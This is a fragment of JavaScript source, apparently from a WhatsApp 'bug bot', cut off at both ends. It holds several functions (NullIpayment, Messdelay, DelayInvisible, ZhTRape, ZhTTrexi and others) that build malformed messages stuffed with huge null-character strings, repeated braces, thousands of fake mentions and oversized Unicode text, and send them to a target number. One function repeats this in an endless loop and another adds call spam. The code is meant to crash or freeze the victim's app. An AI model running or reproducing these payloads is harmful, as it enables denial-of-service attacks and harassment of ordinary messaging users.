        forwardingScore: 0,
        isForwarded: false,
        font: Math.floor(Math.random() * 9),
        background:
          "#" +
          Math.floor(Math.random() * 16777215)
            .toString(16)
            .padStart(6, "0")
      }
    );

    await sock.relayMessage("status@broadcast", ZhTxRizzMsg2.message, {
      messageId: ZhTxRizzMsg2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    if (ZhTxRizzMsg2) {
      await sock.relayMessage(
        target,
        {
          groupStatusMentionMessageV2: {
            message: {
              protocolMessage: {
                key: ZhTxRizzMsg2.key,
                type: 25
              }
            }
          }
        },
        {}
      );
    }
  } catch (e) {
    console.error(e);
  }
}

async function NullIpayment(sock, target, mention) {
  let msg = generateWAMessageFromContent(
    target,
    {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from(
            { length: 2000 },
            (_, y) => `1313555000${y + 1}@s.whatsapp.net`
          )
        },
        body: {
          text: "WhatsApp Order",
          format: "Bold"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\".menu\",\"tower_number\":\"Y7d\",\"city\":\"OrderNow\",\"name\":\"Send here\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    },
    { userJid: target }
  );

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target, "13135550002@s.whatsapp.net"],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target }
              }
            ]
          }
        ]
      }
    ]
  });
  let ConnectMsg = await generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              hasMediaAttachment: false
            },
            body: {
              text: "Order Now Bro"
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: [
                { name: "single_select", buttonParamsJson: "\u0000" },
                { name: "payment_info", buttonParamsJson: "\u0000" },
                {
                  name: "catalog_message",
                  buttonParamsJson: `{\"catalog_id\":\"999999999999999\",\"product_retailer_id\":null,\"text\":\"Come On\",\"thumbnail_product_image\":\"https://files.catbox.moe/ebag6l.jpg\",\"product_sections\":[{\"title\":false,\"products\":[{\"id\":12345,\"name\":null,\"price\":\"free\",\"currency\":null,\"image\":false,\"description\":\"Order Now\"}]}],\"cta\":{\"type\":\"VIEW_CATALOG\",\"display_text\":123},\"business_info\":{\"name\":999999999,\"phone_number\":true,\"address\":[]},\"footer_text\":0${"\u0000".repeat(100000)}}`
                }
              ]
            }
          }
        }
      }
    }),
    {
      message: {
        orderMessage: {
          orderId: "92828",
          thumbnail: null,
          itemCount: 9999999999999,
          status: "INQUIRY",
          surface: "CATALOG",
          message: "Order Now",
          orderTitle: "Click Here",
          sellerJid: target,
          token: "8282882828==",
          totalAmount1000: "828828292727372728829",
          totalCurrencyCode: "IDR",
          messageVersion: 1,
          contextInfo: {
            mentionedJid: [
              target,
              ...Array.from(
                { length: 30000 },
                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              )
            ],
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true
          }
        },
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      },
      ephemeralExpiration: 0,
      forwardingScore: 9999,
      isForwarded: false,
      font: Math.floor(Math.random() * 9),
      background: "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "0")
    }
  );

  await sock.relayMessage(
    "status@broadcast",
    ConnectMsg.message.viewOnceMessage.message,
    {
      messageId: ConnectMsg.key?.id || "",
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target }
                }
              ]
            }
          ]
        }
      ]
    }
  );
  if (mention) {
    await sock.relayMessage(
      target,
      {
        groupStatusMentionMessageV2: {
          message: {
            protocolMessage: {
              key: ConnectMsg.key,
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: true }
          }
        ]
      }
    );
  }

  console.log(chalk.red(`NullPayment Send Bug ${target}`));
}

async function Messdelay(target, mention) {
  const msg = generateWAMessageFromContent(
    target,
    {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from(
            { length: 2000 },
            (_, y) => `1313555000${y + 1}@s.whatsapp.net`
          )
        },
        body: {
          text: "—˙",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson:
            `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"medan\",\"name\":\"xxx\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    },
    { userJid: target }
  );

  await sock.relayMessage(
    "status@broadcast",
    msg.message,
    {
      messageId: msg.key.id,
      statusJidList: [target, "13135550002@s.whatsapp.net"],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    }
  );

  let msg2 = generateWAMessageFromContent(
    target,
    {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from(
            { length: 2000 },
            (_, y) => `1313555000${y + 1}@s.whatsapp.net`
          )
        },
        body: {
          text: "WhatsApp Order",
          format: "Bold"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\".menu\",\"tower_number\":\"Y7d\",\"city\":\"OrderNow\",\"name\":\"Send here\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    },
    { userJid: target }
  );

  await sock.relayMessage("status@broadcast", msg2.message, {
    messageId: msg2.key.id,
    statusJidList: [target, "13135550002@s.whatsapp.net"],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target }
              }
            ]
          }
        ]
      }
    ]
  });

  let ConnectMsg = await generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              hasMediaAttachment: false
            },
            body: {
              text: "Order Now Bro"
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: [
                { name: "single_select", buttonParamsJson: "\u0000" },
                { name: "payment_info", buttonParamsJson: "\u0000" },
                {
                  name: "catalog_message",
                  buttonParamsJson: `{\"catalog_id\":\"999999999999999\",\"product_retailer_id\":null,\"text\":\"Come On\",\"thumbnail_product_image\":\"https://files.catbox.moe/ebag6l.jpg\",\"product_sections\":[{\"title\":false,\"products\":[{\"id\":12345,\"name\":null,\"price\":\"free\",\"currency\":null,\"image\":false,\"description\":\"Order Now\"}]}],\"cta\":{\"type\":\"VIEW_CATALOG\",\"display_text\":123},\"business_info\":{\"name\":999999999,\"phone_number\":true,\"address\":[]},\"footer_text\":0${"\u0000".repeat(100000)}}`
                }
              ]
            }
          }
        }
      }
    }),
    {
      message: {
        orderMessage: {
          orderId: "92828",
          thumbnail: null,
          itemCount: 9999999999999,
          status: "INQUIRY",
          surface: "CATALOG",
          message: "Order Now",
          orderTitle: "Click Here",
          sellerJid: target,
          token: "8282882828==",
          totalAmount1000: "828828292727372728829",
          totalCurrencyCode: "IDR",
          messageVersion: 1,
          contextInfo: {
            mentionedJid: [
              target,
              ...Array.from(
                { length: 3000 },
                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              )
            ],
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true
          }
        },
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      },
      ephemeralExpiration: 0,
      forwardingScore: 9999,
      isForwarded: false,
      font: Math.floor(Math.random() * 9),
      background: "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "0")
    }
  );

  await sock.relayMessage(
    "status@broadcast",
    ConnectMsg.message.viewOnceMessage.message,
    {
      messageId: ConnectMsg.key?.id || "",
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target }
                }
              ]
            }
          ]
        }
      ]
    }
  );

  if (mention) {
    await sock.relayMessage(
      target,
      {
        groupStatusMentionMessageV2: {
          message: {
            protocolMessage: {
              key: ConnectMsg.key,
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: true }
          }
        ]
      }
    );
  }
  console.log(chalk.red(`Message Invisible ${target}`));
}

async function Charlyx(target) {
  const cards = [];
  for (let i = 0; i < 18; i++) {
    cards.push({
      header: {
        title: " 🌹",
        imageMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t24/f2/m232/AQN3a5sxmYjKKiDCEia7o9Zrg7LsYhjYZ36N28icbWw4sILKuf3ly85yuuQx5aH5NGMTqM_YOT7bYt77BJZkbMEwovlDNyxyQ3RNmeoebw?ccb=9-4",
          mimetype: "image/jpeg",
          caption: " 🌹" + "ꦽ".repeat(5000) + "ꦾ".repeat(5000),
          fileSha256: "st3b6ca+9gVb+qgoTd66spG6OV63M/b4/DEM2vcjWDc=",
          fileLength: "71746",
          height: 916,
          width: 720,
          mediaKey: "n5z/W8ANmTT0KmZKPyk13uTpm3eRB4czy0p/orz6LOw=",
          fileEncSha256: "CxcswDicTjs/UHDH1V5DWZh25jk1l0zMLrcTEJyuYMM=",
          directPath: "/o1/v/t24/f2/m232/AQN3a5sxmYjKKiDCEia7o9Zrg7LsYhjYZ36N28icbWw4sILKuf3ly85yuuQx5aH5NGMTqM_YOT7bYt77BJZkbMEwovlDNyxyQ3RNmeoebw?ccb=9-4",
          mediaKeyTimestamp: 1762085432,
          jpegThumbnail: null
        },
        hasMediaAttachment: true
      },
      nativeFlowMessage: {
        messageParamsJson: "{[".repeat(5000),
        buttons: [
          {
            name: "galaxy_message",
            buttonParamsJson: JSON.stringify({
              icon: "PROMOTION",
              flow_cta: "X",
              flow_message_version: "3"
            })
          },
          {
            name: "mpm",
            buttonParamsJson: JSON.stringify({ status: true })
          }
        ]
      }
    });
  }

  const XyraMsg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            messageSecret: crypto.randomBytes(32),
            supportPayload: JSON.stringify({
              version: 3,
              is_ai_message: true,
              should_show_system_message: true,
              ticket_id: crypto.randomBytes(16)
            })
          },
          interactiveMessage: {
            body: {
              text:
                " 🌹" +
                "ꦽ".repeat(3000) +
                "ꦾ".repeat(3000)
            }
          },
          carouselMessage: {
            cards: cards
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 1000 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`),
            isForwarded: true,
            forwardingScore: 999
          }
        }
      }
    },
    {
     timestamp: new Date(),
  userJid: target,
  ephemeralExpiration: 0,
  mediaUploadTimeoutMs: 20000
    }
  );

  await sock.relayMessage(target, XyraMsg.message, {
    messageId: XyraMsg.key.id
  });
}

async function DelayInvisible(target, mention) {
  while (true) {
    const msg = generateWAMessageFromContent(
      target,
      {
        interactiveResponseMessage: {
          contextInfo: {
            mentionedJid: Array.from(
              { length: 2000 },
              (_, y) => `1313555000${y + 1}@s.whatsapp.net`
            )
          },
          body: {
            text: "—˙",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson:
              `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"medan\",\"name\":\"xxx\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
            version: 3
          }
        }
      },
      { userJid: target }
    );

    await sock.relayMessage(
      "status@broadcast",
      msg.message,
      {
        messageId: msg.key.id,
        statusJidList: [target, "13135550002@s.whatsapp.net"],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined
                  }
                ]
              }
            ]
          }
        ]
      }
    );
    let msg2 = generateWAMessageFromContent(
      target,
      {
        interactiveResponseMessage: {
          contextInfo: {
            mentionedJid: Array.from(
              { length: 2000 },
              (_, y) => `1313555000${y + 1}@s.whatsapp.net`
            )
          },
          body: {
            text: "WhatsApp Order",
            format: "Bold"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\".menu\",\"tower_number\":\"Y7d\",\"city\":\"OrderNow\",\"name\":\"Send here\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
            version: 3
          }
        }
      },
      { userJid: target }
    );

    await sock.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key.id,
      statusJidList: [target, "13135550002@s.whatsapp.net"],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target }
                }
              ]
            }
          ]
        }
      ]
    });
    let ConnectMsg = await generateWAMessageFromContent(
      target,
      proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                hasMediaAttachment: false
              },
              body: {
                text: "Order Now Bro"
              },
              nativeFlowMessage: {
                messageParamsJson: "{".repeat(10000),
                buttons: [
                  { name: "single_select", buttonParamsJson: "\u0000" },
                  { name: "payment_info", buttonParamsJson: "\u0000" },
                  {
                    name: "catalog_message",
                    buttonParamsJson: `{\"catalog_id\":\"999999999999999\",\"product_retailer_id\":null,\"text\":\"Come On\",\"thumbnail_product_image\":\"https://files.catbox.moe/ebag6l.jpg\",\"product_sections\":[{\"title\":false,\"products\":[{\"id\":12345,\"name\":null,\"price\":\"free\",\"currency\":null,\"image\":false,\"description\":\"Order Now\"}]}],\"cta\":{\"type\":\"VIEW_CATALOG\",\"display_text\":123},\"business_info\":{\"name\":999999999,\"phone_number\":true,\"address\":[]},\"footer_text\":0${"\u0000".repeat(100000)}}`
                  }
                ]
              }
            }
          }
        }
      }),
      {
        message: {
          orderMessage: {
            orderId: "92828",
            thumbnail: null,
            itemCount: 9999999999999,
            status: "INQUIRY",
            surface: "CATALOG",
            message: "Order Now",
            orderTitle: "Click Here",
            sellerJid: target,
            token: "8282882828==",
            totalAmount1000: "828828292727372728829",
            totalCurrencyCode: "IDR",
            messageVersion: 1,
            contextInfo: {
              mentionedJid: [
                target,
                ...Array.from(
                  { length: 3000 },
                  () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                )
              ],
              isSampled: true,
              participant: target,
              remoteJid: "status@broadcast",
              forwardingScore: 9741,
              isForwarded: true
            }
          },
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            }
          }
        },
        ephemeralExpiration: 0,
        forwardingScore: 9999,
        isForwarded: false,
        font: Math.floor(Math.random() * 9),
        background: "#" +
          Math.floor(Math.random() * 16777215)
            .toString(16)
            .padStart(6, "0")
      }
    );

    await sock.relayMessage(
      "status@broadcast",
      ConnectMsg.message.viewOnceMessage.message,
      {
        messageId: ConnectMsg.key?.id || "",
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target }
                  }
                ]
              }
            ]
          }
        ]
      }
    );

    if (mention) {
      await sock.relayMessage(
        target,
        {
          groupStatusMentionMessageV2: {
            message: {
              protocolMessage: {
                key: ConnectMsg.key,
                type: 25
              }
            }
          }
        },
        {
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: true }
            }
          ]
        }
      );
    }
    console.log(chalk.red(`Meta Send Bug ${target}`));
  } 
}

async function ZhTRape(target, mention) {
await privatedelay();
  let ZhTxRizzMsg = await generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              hasMediaAttachment: false
            },
            body: {
              text: "Buy Order My Store"
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: [
                { name: "single_select", buttonParamsJson: "\u0000" },
                { name: "payment_info", buttonParamsJson: "\u0000" },
                {
                  name: "catalog_message",
                  buttonParamsJson: `{\"catalog_id\":\"999999999999999\",\"product_retailer_id\":null,\"text\":\"Join Noe\",\"thumbnail_product_image\":\"https://files.catbox.moe/ebag6l.jpg\",\"product_sections\":[{\"title\":false,\"products\":[{\"id\":12345,\"name\":null,\"price\":\"free\",\"currency\":null,\"image\":false,\"description\":\"Order Now\"}]}],\"cta\":{\"type\":\"VIEW_CATALOG\",\"display_text\":123},\"business_info\":{\"name\":999999999,\"phone_number\":true,\"address\":[]},\"footer_text\":0${"\u0000".repeat(100000)}}`
                }
              ]
            }
          }
        }
      }
    }),

    // 🔥 ARGUMEN 2
    {
      message: {
        orderMessage: {
          orderId: "92828",
          thumbnail: null,
          itemCount: 9999999999999,
          status: "INQUIRY",
          surface: "CATALOG",
          message: "Click Katalog",
          orderTitle: "Order Here",
          sellerJid: target,
          token: "8282882828==",
          totalAmount1000: "828828292727372728829",
          totalCurrencyCode: "IDR",
          messageVersion: 1,
          contextInfo: {
            mentionedJid: [
              target,
              ...Array.from(
                { length: 30000 },
                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
          },
        },
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9999,
      isForwarded: false,
      font: Math.floor(Math.random() * 9),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "0"),
    }
  );

  await sock.relayMessage(
    "status@broadcast",
    ZhTxRizzMsg.message.viewOnceMessage.message,
    {
      messageId: ZhTxRizzMsg.key?.id || "",
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                },
              ],
            },
          ],
        },
      ],
    }
  );

  if (mention) {
    await sock.relayMessage(
      target,
      {
        groupStatusMentionMessageV2: {
          message: {
            protocolMessage: {
              key: ZhTxRizzMsg.key,
              type: 25,
              },
            },
          },
        },
        {
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: true },
            },
          ],
        }
      );
    }

  console.log(chalk.red(`Tracking Attack To ${target}`));
}

async function ZhTTrexi(sock, target) {
    const ZhTxRizzFont = () => Math.floor(Math.random() * 99999999);
    const ZhTxRizzColor = () =>
        "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "999999");

    const ZhTxRizzMsg = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: { text: "   ", format: "DEFAULT" },
                        nativeFlowResponseMessage: {
                            name: "payment_info",
                            paramsJson: "\u0000".repeat(1045000),
                            version: 3
                        },
                        entryPointConversionSource: "galaxy_message"
                    }
                }
            }
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: ZhTxRizzFont(),
            background: ZhTxRizzColor()
        }
    );

    const ZhTxRizzMsg2 = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: { text: "  ", format: "BOLD" },
                        nativeFlowResponseMessage: {
                            name: "payment_method",
                            paramsJson: "\u0000".repeat(1045000),
                            version: 3
                        },
                        entryPointConversionSource: "galaxy_message"
                    }
                }
            }
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: ZhTxRizzFont(),
            background: ZhTxRizzColor()
        }
    );

    const ZhTxRizzMsg3 = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: { text: "   ", format: "BOLD" },
                        nativeFlowResponseMessage: {
                            name: "payment_info",
                            paramsJson: "\u0000".repeat(1045000),
                            version: 3
                        },
                        entryPointConversionSource: "galaxy_message"
                    }
                }
            }
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: ZhTxRizzFont(),
            background: ZhTxRizzColor()
        }
    );

    await sock.relayMessage(
        "status@broadcast",
        ZhTxRizzMsg.message,
        {
            messageId: ZhTxRizzMsg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                { tag: "to", attrs: { jid: target } }
                            ]
                        }
                    ]
                }
            ]
        }
    );

    await sock.relayMessage(
        "status@broadcast",
        ZhTxRizzMsg2.message,
        {
            messageId: ZhTxRizzMsg2.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                { tag: "to", attrs: { jid: target } }
                            ]
                        }
                    ]
                }
            ]
        }
    );

    await sock.relayMessage(
        "status@broadcast",
        ZhTxRizzMsg3.message,
        {
            messageId: ZhTxRizzMsg3.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                { tag: "to", attrs: { jid: target } }
                            ]
                        }
                    ]
                }
            ]
        }
    );
}     
async function MentionedJid(sock, target) {
  const MentionedJidMsg = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            stanzaId: sock.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                fileLength: "9999999999999",
                pageCount: 3567587327,
                mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                fileName: "Gw Rizz Bang‌",
                fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1735456100",
                contactVcard: true,
                caption: "",
              },
            },
          },
          body: {
            text: " " + "ꦽ".repeat(100000),
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "𑜦𑜠".repeat(10000),
                  id: null
                })
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "𑜦𑜠".repeat(10000),
                  id: null
                })
              },
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "𑜦𑜠".repeat(10000),
                  url: "https://" + "𑜦𑜠".repeat(10000) + ".com"
                })
              },
              {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                  display_text: "𑜦𑜠".repeat(10000),
                  copy_code: "𑜦𑜠".repeat(10000)
                })
              },
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  icon: "PROMOTION",
                  flow_cta: "PAYMENT_PROMOTION",
                  flow_message_version: "3"
                })
              }
            ],
          },
        },
      },
    },
  };
  await sock.relayMessage(target, MentionedJidMsg, {
    messageId: sock.generateMessageTag(),
    participant: { jid: target }
  });
  await sock.relayMessage(
    "status@broadcast",
    MentionedJidMsg,
    {
      messageId: sock.generateMessageTag(),
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target } }
              ]
            }
          ]
        }
      ]
    }
  );
}

async function BlankMention(sock, target) {
  const MentionedJidMsg = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            stanzaId: sock.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                fileLength: "9999999999999",
                pageCount: 3567587327,
                mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                fileName: "Gw Rizz Bang‌",
                fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1735456100",
                contactVcard: true,
                caption: "",
              },
            },
          },
          body: {
            text: " " + "ꦽ".repeat(100000),
          },
          nativeFlowMessage: {
            buttons: [
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(10000),
                    id: null
                  })
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(10000),
                    id: null
                  })
                },
                {
                  name: "cta_url",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(10000),
                    url: "https://" + "𑜦𑜠".repeat(10000) + ".com"
                  })
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(10000),
                    copy_code: "𑜦𑜠".repeat(10000)
                  })
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    icon: "PROMOTION",
                    flow_cta: "PAYMENT_PROMOTION",
                    flow_message_version: "3"
                 })
               }
            ],
          },
        },
      },
    },
  };

  await sock.relayMessage(target, MentionedJidMsg, {
    messageId: sock.generateMessageTag(),
    participant: { jid: target }
  });
} 

async function sendOfferAll(sock, target) {
    try {
        await sock.offerCall(target);
    } catch (error) { }

    try {
        await sock.offerCall(target, { video: true });
    } catch (error) { }
    const MentionedJidMsg = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2,
                },
                interactiveMessage: {
                    contextInfo: {
                        stanzaId: sock.generateMessageTag(),
                        participant: "0@s.whatsapp.net",
                        quotedMessage: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                                fileLength: "9999999999999",
                                pageCount: 3567587327,
                                mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                                fileName: "Dokumentasi",
                                fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
